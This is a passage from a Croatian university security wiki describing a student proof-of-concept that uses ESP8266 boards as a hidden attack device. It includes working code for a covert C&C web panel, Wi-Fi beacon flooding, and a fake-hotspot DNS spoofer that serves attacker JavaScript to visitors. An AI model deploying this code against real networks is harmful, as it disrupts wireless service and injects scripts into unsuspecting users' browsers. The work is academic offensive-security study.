+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:902px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp-3d-print.png" class="image"><img alt="" src="../images/thumb/3/3b/Esp-3d-print.png/900px-Esp-3d-print.png" width="900" height="318" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Esp-3d-print.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 49.</b> Kućište za 3D print</div></div></div></div>
+<p>3D objekt za printanje dostupan je na za preuzimanje na sljedećem linku <a href="https://www.tinkercad.com/things/kkx3c1RP4c8-sisbox-full/editv2?sharecode=SXJGaFZfwJFloNcvvgK3lET0z3qwlq5UC3dnjBxQYq4=" class="external free" rel="nofollow">https://www.tinkercad.com/things/kkx3c1RP4c8-sisbox-full/editv2?sharecode=SXJGaFZfwJFloNcvvgK3lET0z3qwlq5UC3dnjBxQYq4=</a>
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:702px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Photo_1.JPG" class="image"><img alt="" src="../images/thumb/4/4e/Photo_1.JPG/700px-Photo_1.JPG" width="700" height="523" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Photo_1.JPG" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 50.</b> 3D print</div></div></div></div>
+<h3> <span class="mw-headline" id="Implementacija_funkcionalnosti"> Implementacija funkcionalnosti </span></h3>
+<p>U ovom dijelu pojasniti ćemo proof of concept implementaciju sljedećih funkcionalnosti:
+</p>
+<ol><li> <b>Serijska komunikacija između <i>Node</i>-ova (C&amp;C vs. Execute)</b>
+</li><li> <b>Komunikacija s napadačem</b>
+<ol><li> <b>putem lokalne bežićne mreže</b>
+</li></ol>
+</li><li> <b>(D)DOS</b>
+<ol><li> <b>SSID beacon flooding</b>
+</li><li> <b>DeAuth jamming (još nije implementirano)</b>
+</li><li> <b>Null Probe response flooding (još nije implementirano)</b>
+</li></ol>
+</li><li> <b>DNS spoofing</b>
+</li></ol>
+<h4> <span class="mw-headline" id="Serijska_komunikacija_izme.C4.91u_Node-ova_.28C.26C_vs._Execute.29"> Serijska komunikacija između <i>Node</i>-ova (C&amp;C vs. Execute) </span></h4>
+<p>Kako je pojašnjeno u prethodnom poglavlju, koje govori o implementaciji hardvera, za komunikaciju između nodeova koristi se serijska veza. Kako ne bi morali raditi na low lewel komunikaciji, korištena je biblioteka EasyTransfer (<a href="https://github.com/madsci1016/Arduino-EasyTransfer" class="external free" rel="nofollow">https://github.com/madsci1016/Arduino-EasyTransfer</a>). Spomenuta biblioteka omogućava kreiranje vlastite strukture paketa koji se šalje između povezanih uređaja. 
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:402px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Dijagramspajanjanodemcu.png" class="image"><img alt="" src="../images/thumb/0/02/Dijagramspajanjanodemcu.png/400px-Dijagramspajanjanodemcu.png" width="400" height="251" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Dijagramspajanjanodemcu.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 50.</b> Blok dijagram spajanja nodeova</div></div></div></div>
+<p>U implementaciji je napravljena struktura sljedećeg oblika:
+</p>
+<pre>
+struct PACKET {
+	int command;
+	int param;
+	char value[255];
+};
+</pre>
+<p>gdje polja imaju sljedeći značaj:
+</p>
+<ul><li>command - cijeli broj koji određuje operaciju koja se ima izvršiti
+</li><li>param - cijeli broj koji nosi dodatnu informaciju i određuje neku specifičnost izvođenja operacije
+</li><li>value - tekstualnog oblika, do 255 znakova, predstavlja podatke koji su potrebni pri izvođenju operacije
+</li></ul>
+<h4> <span class="mw-headline" id="Komunikacija_s_napada.C4.8Dem"> Komunikacija s napadačem </span></h4>
+<p>Komunikacija s napadačem odvija se putem napadačeve pristupne točke. CommandAndControl node konstantno skenira okolne bežićne mreže i ukoliko detektira da je dostupna mreža koja odgovara unaprijed dogovorenim kredencijalima, tada se na istu mrežu spaja i pokreće webserver. Napadač se tada može direktno spojiti na C&amp;C web panel kojeg poslužuje uređaj. Ovo je primarno iz razloga da se uređaj ne bi mogao tako lako detektirati ukoliko je potreba da ostane skriven.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:618px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Cncwebpanel.png" class="image"><img alt="" src="../images/c/c0/Cncwebpanel.png" width="616" height="640" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Cncwebpanel.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 50.</b> C&amp;C Web Panel</div></div></div></div>
+<p>Kako možemo vidjeti iz priloženog, panel je vrlo jednostavan, poglavito iz razloga što mora biti posluživan sa same pločice. Panel nudi pokretanje operacija svih implementiranih funkcionalnosti. Način rada je sljedeći; kada napadač pokrene neki napad, na server se šalje novi zahtijev sa specifičnim GET parametrima. Nakon toga, webserver obrađuje zahtijev i izvršava potrebnu operaciju.
+</p><p>U nastavku slijedi korisnički ruter:
+</p>
+<pre>
+PACKET requestHandler() {
+	// Provjerava se da li se klijent spojio
+	PACKET packet;
+	client = server.available();
+	if (!client) {
+		packet.command = -1;
+		return packet;
+	}
+
+	//Čeka se da klijent pošalje svoj zahtijev
+	Serial.println(&quot;Novi klijent na C2C panelu!&quot;);
+	while (!client.available()) {
+		delay(1);
+	}
+
+	//Čita se prva linija requesta te se čisti korisnički buffer
+	String request = client.readStringUntil('\r');
+	Serial.println(request);
+	client.flush();
+
+        //Klijentu se odgovara sa shodnim zaglavljem i sadržajem
+	client.println(&quot;HTTP/1.1 200 OK&quot;);
+	client.println(&quot;Content-Type: text/html&quot;);
+	client.println(&quot;&quot;); //  do not forget this one
+
+        //U ovom se dijelu korisnika preusmjerava na potrebnu akciju
+	if (request.indexOf(&quot;/flo&quot;)&#160;!= -1) {
+		int numberOfSeconds = request.substring(request.indexOf(&quot;=&quot;) + 1,
+				request.indexOf(&quot; HTTP&quot;)).toInt();
+		client.println(html);
+		delay(1);
+		packet.command = 1;
+		packet.param = numberOfSeconds;
+	} else if (request.indexOf(&quot;/dns&quot;)&#160;!= -1) {
+		int numberOfSeconds = request.substring(request.indexOf(&quot;d=&quot;) + 1,
+				request.indexOf(&quot;&amp;pay&quot;)).toInt();
+		const char *payload = request.substring(request.indexOf(&quot;pay=&quot;) + 4,
+				request.indexOf(&quot; HTTP&quot;)).c_str();
+		client.println(html);
+		delay(1);
+		packet.command = 2;
+		packet.param = numberOfSeconds;
+		strcpy(packet.value, payload);
+	} else {
+		client.println(html);
+		delay(1);
+		packet.command = 0;
+	}
+        
+        //Backendu se vraća zahtijev u strukturi paketa sa naredbom, parametrom i vrijednošću
+	return packet;
+}
+</pre>
+<p>Dio koda koji obrađuje zaprimljeni paket od korisničkog rutera i šalje odgovarajuću naredbu Execute nodu:
+</p>
+<pre>
+switch (request.command) {
+		case -1:
+			delay(1000);
+			break;
+		case 0:
+			break;
+		case 1:
+			packet.command = 1;
+			packet.param = request.param;
+			strcpy(packet.value, request.value);
+			ET.sendData();
+			break;
+		case 2:
+			packet.command = 2;
+			packet.param = request.param;
+			Serial.println(&quot;Strcopy!&quot;);
+			strcpy(packet.value, request.value);
+			Serial.println(packet.value);
+			ET.sendData();
+			break;
+		}
+</pre>
+<h4> <span class="mw-headline" id="SSID_beacon_flooding"> SSID beacon flooding </span></h4>
+<div class="thumb tright"><div class="thumbinner" style="width:182px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Beacon-wireshark.png" class="image"><img alt="" src="../images/thumb/0/06/Beacon-wireshark.png/180px-Beacon-wireshark.png" width="180" height="161" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Beacon-wireshark.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 53.</b> Wireshark pregled beacon okvira (Izvor: <a href="https://www.offensive-security.com/information-security-training/offensive-security-wireless-attacks/" class="external free" rel="nofollow">https://www.offensive-security.com/information-security-training/offensive-security-wireless-attacks/</a>)</div></div></div>
+<p>SSID beacon flooding prva je od implementiranih ofenzivnih funkcionalnosti. Ova funkcionalnost oslanja se na tzv. <tt>promiscous</tt> modu rada koji dolazi iz službenog ESP8266 SDK-a. U promiscous modu dozvoljeno je konstruirati vlastiti okvir i slobodno ga odaslati. Za mogućnost odašiljanja slobodnih paketa koristi se funkcija <tt>wifi_send_pkt_freedom()</tt>. Ovo nam omogućuje da konstruiramo vlastiti <i>beacon</i> okvir, čija je zadaća informirati okolne uređaje da WiFi pristupna točka postoji. 
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:602px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Beacon-frame.png" class="image"><img alt="" src="../images/thumb/e/e1/Beacon-frame.png/600px-Beacon-frame.png" width="600" height="238" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Beacon-frame.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 51.</b> Struktura beacon okvira (Izvor: <a href="http://www.mdpi.com/1424-8220/14/1/1850/htm" class="external free" rel="nofollow">http://www.mdpi.com/1424-8220/14/1/1850/htm</a>)</div></div></div></div>
+<p>Navedeno u ovoj funkcionalnosti koristimo kako bismo oglašavali nepostojeće pristupne točke, i to u velikoj količini (tzv, <i>flooding</i>) i tako zaglušili pronalaženje ispravne pristupne točke. Neki uređaji imuni su na ovaj napad jer imaju vrlo mali interval skeniranja mreže, pa se u listi dostupnih pristupnih točaka nađe samo jedan lažan. Na većini uređaja interval je dovoljno velik da budu zahvaćeni ovim napadom.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:402px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_2017-01-16-00-37-05.png" class="image"><img alt="" src="../images/thumb/7/7e/Screenshot_2017-01-16-00-37-05.png/400px-Screenshot_2017-01-16-00-37-05.png" width="400" height="565" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_2017-01-16-00-37-05.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 52.</b> SSID beacon flooding - screenshot sa Nexus 7 2012. Android uređaja</div></div></div></div>
+<p>U nastavku slijedi kod koji implementira funkcionalnost:
+</p>
+<pre>
+namespace SSIDFlood {
+
+byte channel;
+
+//Kreiranje paketa sa statičkim vrijednostima (plain paket)
+uint8_t packet[] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+		0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+		0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 0x00,
+		0x01, 0x04, 0x00, 0x20, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+		0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+		0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
+		0x04 };
+
+//Omogućavanje promiscous moda
+void enablePromiscousMode() {
+	wifi_station_disconnect();
+	wifi_set_opmode(STATION_MODE);
+	wifi_promiscuous_enable(1);
+}
+
+//Petlja u kojoj se izmjenjuju vrijednosti iz statičnog paketa te se paket odašilje
+int startFlooding(int time) {
+	enablePromiscousMode();
+	int timeInMs = time * 1000;
+	while (timeInMs) {
+		channel = random(1, 12);
+		wifi_set_channel(channel);
+
+		for (int i = 10; i &lt; 22; i++) {
+			packet[10] = random(256);
+		}
+
+		for (int i = 38; i &lt; 70; i++) {
+			packet[i] = wchar_t(random(65480));
+		}
+
+		packet[82] = channel;
+
+		wifi_send_pkt_freedom(packet, 83, 0);
+
+		timeInMs -= 1;
+		delay(1);
+	}
+
+	wifi_promiscuous_enable(0);
+	return 1;
+}
+</pre>
+<p>Treba obratiti pažnju na sljedeće. Espressif je od SDK 1.4 uklonio mogućnost slobodnog slanja paketa, pa je potrebno se prebaciti, ukoliko se koristi Arduino core, na commit <tt>1c5751460b7988041fdc80e0f28a31464cdf97a3</tt>.
+</p>
+<pre>
+git checkout 1c5751460b7988041fdc80e0f28a31464cdf97a3
+</pre>
+<h4> <span class="mw-headline" id="DNS_spoofing"> DNS spoofing </span></h4>
+<p>Sljedeća funkcionalnost jest DNS spoofing, tj., korištenje lažnog DNS servisa koji namjerno vraća krive DNS zapise, ne bi li korisnika preusmjerio na stranicu sa malicioznim kodom, ili pak phishing stranicu. Konkretno, u trenutnoj implementaciji, napadač može preko C&amp;C panela unijeti Javascipt payload u HEX obliku, a onda ga Execute node servira korisnicima.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:579px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Dnsspoofing.png" class="image"><img alt="" src="../images/1/14/Dnsspoofing.png" width="577" height="360" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Dnsspoofing.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 54.</b> Unos Javascript payloada u HEX obliku</div></div></div></div>
+<p>Napad se najbolje može očitovati na javnome mjestu, gdje bi bilo dosta korisnika koji bi se spajali na lažnu pristupnu točku sa besplatnim internetom. Kada je korisnik spojen na pristupnu točku, svi DNS requestovi preusmjeravaju se na lokalnog DNS poslužitelja, koji pak za svaki zahtijev poslužuje istu stranicu.
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:802px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_from_2017-01-16_13-43-31.png" class="image"><img alt="" src="../images/thumb/3/3d/Screenshot_from_2017-01-16_13-43-31.png/800px-Screenshot_from_2017-01-16_13-43-31.png" width="800" height="457" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Screenshot_from_2017-01-16_13-43-31.png" class="internal" title="Povećaj"><img src="../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div><b>Slika 55.</b> Primamljiva (čitaj lažna) pristupna točka</div></div></div></div>
+<p>U nastavku je kod implementacije DNS spoofera:
+</p>
+<pre>
+namespace DNSSpoofer {
+	const byte DNS_PORT = 53;
+	IPAddress apIP(192, 168, 1, 1);
+	DNSServer dnsServer;
+	ESP8266WebServer webServer(80);
+
+	char nibble2c(char c)
+	{
+	   if ((c&gt;='0') &amp;&amp; (c&lt;='9'))
+	      return c-'0'&#160;;
+	   if ((c&gt;='A') &amp;&amp; (c&lt;='F'))
+	      return c+10-'A'&#160;;
+	   if ((c&gt;='a') &amp;&amp; (c&lt;='a'))
+	      return c+10-'a'&#160;;
+	   return -1&#160;;
+	}
+
+	char hex2c(char c1, char c2)
+	{
+	   if(nibble2c(c2) &gt;= 0)
+	     return nibble2c(c1)*16+nibble2c(c2)&#160;;
+	   return nibble2c(c1)&#160;;
+	}
+
+	String hex2str(char *data)
+	{
+	   String result = &quot;&quot;&#160;;
+	   for (int i=0&#160;; nibble2c(data[i])&gt;=0&#160;; i++)
+	   {
+	      result += hex2c(data[i],data[i+1])&#160;;
+	      if(nibble2c(data[i+1])&gt;=0)
+	        i++&#160;;
+	   }
+	   return result;
+	}
+
+	int startDnsSpoofer(char *payload, int time) {
+		WiFi.mode(WIFI_AP);
+		WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+		WiFi.softAP(&quot;Free Hotspot&#160;:)&quot;);
+
+		dnsServer.setTTL(300);
+		dnsServer.setErrorReplyCode(DNSReplyCode::ServerFailure);
+
+		dnsServer.start(DNS_PORT, &quot;*&quot;, apIP);
+
+		webServer.onNotFound([&amp;payload]() {
+			String message = &quot;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;&quot;;
+			message += hex2str(payload);
+			message += &quot;&lt;/script&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
+			Serial.println(message);
+			webServer.send(200, &quot;text/plain&quot;, message);
+		});
+
+		webServer.begin();
+
+		int timeInMs = time * 1000;
+		while (timeInMs) {
+			  dnsServer.processNextRequest();
+			  webServer.handleClient();
+			  timeInMs -= 100;
+			  delay(100);
+		}
+		webServer.stop();
+		WiFi.mode(WIFI_STA);
+		return 1;
+	}
+}
+</pre>
+<h3> <span class="mw-headline" id="Budu.C4.87i_rad"> Budući rad </span></h3>
+<p>Planirano je napraviti još nekoliko nadogradnji i implementacija:
+</p>
+<ul><li>Ethernet priključak - omogućio bi spajanje na žićnu mrežu
+</li><li>OTA - over-the-air update, omogućuje reprogramiranje putem mreže
+</li><li>GSM modul - omogućuje komunikaciju s napadačem putem sigurne i uvijek dostupne veze
+</li><li>Implementacija ostalih vrsta napada i skenera ranjivosti.
+</li></ul>
+<h2> <span class="mw-headline" id="Izvorni_kod"> Izvorni kod </span></h2>
+<p>Sav izvorni kod dostupan je na Git repozitoriju na adresi:
+<a href="https://github.com/rLoka/ESP8266" class="external free" rel="nofollow">https://github.com/rLoka/ESP8266</a>
+</p><p><b>Autori od kojih su preuzeti neki dijelovi koda spomenuti su na početku datoteke koja sadrži posuđeni izvorni kod.</b>
+</p><p>Izvorni kod stavljen je u javnu domenu <a href="http://unlicense.org/" class="external text" rel="nofollow">Unlicense</a> licencijom (osim djelova preuzetih od drugih autora koji zadržavaju svoju licenciju):
+</p>
+<pre style="background-color: #f2f2f2; border: solid thin grey;">
+This is free and unencumbered software released into the public domain.
+
+Anyone is free to copy, modify, publish, use, compile, sell, or
+distribute this software, either in source code form or as a compiled
+binary, for any purpose, commercial or non-commercial, and by any
+means.
+
+In jurisdictions that recognize copyright laws, the author or authors
+of this software dedicate any and all copyright interest in the
+software to the public domain. We make this dedication for the benefit
+of the public at large and to the detriment of our heirs and
+successors. We intend this dedication to be an overt act of
+relinquishment in perpetuity of all present and future rights to this
+software under copyright law.
+
+THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND,
+EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
+MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
+OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
+ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
+OTHER DEALINGS IN THE SOFTWARE.
+
+For more information, please refer to &lt;http://unlicense.org/&gt;
+</pre>
+<h2> <span class="mw-headline" id="Zaklju.C4.8Dak"> Zaključak </span></h2>
+<p>U ovom radu obrađen je jedan od popularnijih IOT hardvera te su istaknute njegove tehničke karakteristike, mogućnosti, načini rada i korištenje u ofenzivnoj sigurnosti. Pokazano je kako pločica pokriva vrlo specifičnu domenu ofenzivne sigurnosti, a ta je rad na udeljenosti kao prijenosni i skriveni uređaj.
+</p>
+<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
+<div style="column-count:2;-moz-column-count:2;-webkit-column-count:2">
+<ol><li><i>Wikipedia</i>, NodeMCU, preuzeto 30.12.2016. sa <a href="https://en.wikipedia.org/wiki/NodeMCU" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/NodeMCU</a>
+</li><li><i>Nicky Woolf, The Guardian</i>,DDoS attack that disrupted internet was largest of its kind in history, experts say, preuzeto 31.12.2016. sa <a href="https://www.theguardian.com/technology/2016/oct/26/ddos-attack-dyn-mirai-botnet" class="external free" rel="nofollow">https://www.theguardian.com/technology/2016/oct/26/ddos-attack-dyn-mirai-botnet</a>
+</li><li><i>Gaillard F., Eieland A., Atmel</i>, Microprocessor (MPU) or Microcontroller (MCU)? What factors should you consider when selecting the right processing device for your next design, preuzeto 31.12.2016. sa  <a href="http://www.atmel.com/Images/MCU_vs_MPU_Article.pdf" class="external free" rel="nofollow">http://www.atmel.com/Images/MCU_vs_MPU_Article.pdf</a>
+</li><li><i>Radovici A.</i>, Lecture 5: Electronics for the Internet of Things, preuzeto 31.12.2016. sa <a href="http://ocw.cs.pub.ro/courses/iot/courses/05" class="external free" rel="nofollow">http://ocw.cs.pub.ro/courses/iot/courses/05</a>
+</li><li><i>Wikipedia</i>, System on a chip, preuzeto 08.01.2017. sa <a href="https://en.wikipedia.org/wiki/System_on_a_chip" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/System_on_a_chip</a>
+</li><li><i>Espriff</i>, ESP8266EX Datasheet, preuzeto 08.01.2017. sa <a href="http://espressif.com/sites/default/files/documentation/0a-esp8266ex_datasheet_en.pdf" class="external free" rel="nofollow">http://espressif.com/sites/default/files/documentation/0a-esp8266ex_datasheet_en.pdf</a>
+</li><li><i>Wikipedia</i>, Static random-access memory, preuzeto 08.01.2017. sa <a href="https://en.wikipedia.org/wiki/Static_random-access_memory" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Static_random-access_memory</a>
+</li><li><i>Wikipedia</i>, Wi-Fi Direct, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Wi-Fi_Direct" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Wi-Fi_Direct</a>
+</li><li><i>Wikipedia</i>, Wireless LAN, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Wireless_LAN" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Wireless_LAN</a>
+</li><li><i>Wikipedia</i>, CCMP, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/CCMP" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/CCMP</a>
+</li><li><i>Wikipedia</i>, Temporal Key Integrity Protocol, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol</a>
+</li><li><i>Wikipedia</i>, WLAN Authentication and Privacy Infrastructure, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/WLAN_Authentication_and_Privacy_Infrastructure" class="external text" rel="nofollow">https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol</a>
+</li><li><i>Wikipedia</i>, Wired Equivalent Privacy, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy</a>
+</li><li><i>Wikipedia</i>, Cyclic redundancy check, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Cyclic_redundancy_check</a>
+</li><li><i>Wikipedia</i>, Wi-Fi Protected Access, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access</a>
+</li><li><i>Wikipedia</i>, Wi-Fi Protected Setup, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup</a>
+</li><li><i>Espriff</i>, ESP8266 Non-OS SDK, API Reference, preuzeto 09.01.2017. sa <a href="https://espressif.com/sites/default/files/documentation/2c-esp8266_non_os_sdk_api_reference_en.pdf" class="external free" rel="nofollow">https://espressif.com/sites/default/files/documentation/2c-esp8266_non_os_sdk_api_reference_en.pdf</a>
+</li><li><i>Wikipedia</i>, ESP8266, preuzeto 09.01.2017. sa <a href="https://en.wikipedia.org/wiki/ESP8266" class="external free" rel="nofollow">https://en.wikipedia.org/wiki/ESP8266</a>
+</li><li><i>elecrow.com</i>, ESP-12F WiFi Module (version 1.0), preuzeto 09.01.2017. sa <a href="https://www.elecrow.com/download/ESP-12F.pdf" class="external free" rel="nofollow">https://www.elecrow.com/download/ESP-12F.pdf</a>
+</li><li><i>ESP8266.net</i>, The Internet of things with ESP8266, preuzeto 09.01.2017. sa <a href="http://esp8266.net" class="external free" rel="nofollow">http://esp8266.net</a>
+</li><li><i>wch.cn</i>, The DataSheet of CH340, preuzeto 09.01.2017. sa <a href="https://www.olimex.com/Products/Breadboarding/BB-CH340T/resources/CH340DS1.PDF" class="external free" rel="nofollow">https://www.olimex.com/Products/Breadboarding/BB-CH340T/resources/CH340DS1.PDF</a>
+</li><li><i>Nick Moore, PyCon Australia</i>, ESP8266 and MicroPython, preuzeto 09.01.2017. sa <a href="https://www.youtube.com/watch?v=C19fFU-TVWU" class="external free" rel="nofollow">https://www.youtube.com/watch?v=C19fFU-TVWU</a>
+</li><li><i>Kolban N.</i>, Kolban's Book on the ESP32 &amp; ESP8266, preuzeto 10.01.2017. sa <a href="https://leanpub.com/ESP8266_ESP32" class="external free" rel="nofollow">https://leanpub.com/ESP8266_ESP32</a>
+</li><li><i>micropython.org</i>, MicroPython, preuzeto 10.01.2017. sa <a href="https://micropython.org/" class="external free" rel="nofollow">https://micropython.org/</a>
+</li><li><i>ESP8266 Community Forum</i>, Arduino core for ESP8266 WiFi chip, preuzeto 11.01.2017. sa <a href="https://github.com/esp8266/Arduino" class="external free" rel="nofollow">https://github.com/esp8266/Arduino</a>
+</li></ol>
+</div>
+<h2> <span class="mw-headline" id="Vanjske_poveznice"> Vanjske poveznice </span></h2>
+<ul><li><a href="https://www.youtube.com/watch?v=7dsyF5048zs" class="external text" rel="nofollow">BalCCon2k16 - Tonimir Kisasondi - Exploring the IoT attack surface</a>
+</li><li><a href="https://www.youtube.com/watch?v=UoBUXOOdLXY" class="external text" rel="nofollow">How Arduino is open-sourcing imagination | Massimo Banzi</a>
+</li></ul>
+<h2> <span class="mw-headline" id="Tako.C4.91er_pogledajte"> Također pogledajte </span></h2>
+<ul><li><a href="Paralllella_board_-_primjena_za_kriptoanalizu.html" title="Paralllella board - primjena za kriptoanalizu">Paralllella board - primjena za kriptoanalizu</a>
+</li><li><a href="Integracija_ESP8266_modula_i_mikrofona.html" title="Integracija ESP8266 modula i mikrofona">Integracija ESP8266 modula i mikrofona</a>
+</li><li><a href="Korištenje_ESP8266_u_kriptografiji.html" title="Korištenje ESP8266 u kriptografiji">Korištenje ESP8266 u kriptografiji</a>
+</li><li><a href="http://security.foi.hr/wiki/index.php/Sigurnosni_problemi_lozinki_i_AES_enkripcija_pomo%C4%87u_ARM_baziranog_mikrokontrolera" title="Sigurnosni problemi lozinki i AES enkripcija pomoću ARM baziranog mikrokontrolera">Sigurnosni problemi lozinki i AES enkripcija pomoću ARM baziranog mikrokontrolera</a>
+</li><li><a href="BadUSB.html" title="BadUSB">BadUSB</a>
+</li><li><a href="Keylogger.html" title="Keylogger">Keylogger</a>
+</li><li><a href="http://security.foi.hr/wiki/index.php/Sigurnost_Wireless_mre%C5%BEa" title="Sigurnost Wireless mreža">Sigurnost Wireless mreža</a>
+</li><li><a href="Hakiranje_uporabom_mobilnih_uređaja_–_footprinting,_scanning,_enumeration,_system_hacking,_sniffing,_Dos_attack,_etc..html" title="Hakiranje uporabom mobilnih uređaja – footprinting, scanning, enumeration, system hacking, sniffing, Dos attack, etc.">Hakiranje uporabom mobilnih uređaja – footprinting, scanning, enumeration, system hacking, sniffing, Dos attack, etc.</a>
+</li><li><a href="http://security.foi.hr/wiki/index.php/%C5%A0irenje_virusa_putem_otvorene_wirelles_mre%C5%BEe" title="Širenje virusa putem otvorene wirelles mreže">Širenje virusa putem otvorene wirelles mreže</a>
+</li><li><a href="Sigurnost_WLAN_mreža.html" title="Sigurnost WLAN mreža">Sigurnost WLAN mreža</a>
+</li><li><a href="http://security.foi.hr/wiki/index.php/Sigurnosni_Wireless_mre%C5%BEe" title="Sigurnosni Wireless mreže">Sigurnosni Wireless mreže</a>
+</li><li><a href="http://security.foi.hr/wiki/index.php/Redovito_pratiti_i_testirati_mre%C5%BEe" title="Redovito pratiti i testirati mreže">Redovito pratiti i testirati mreže</a>
+</li></ul>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 326/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:9215-0!*!0!!hr!2!edit=0 and timestamp 20190203204154 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html">http://security.foi.hr/wiki/index.php/Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
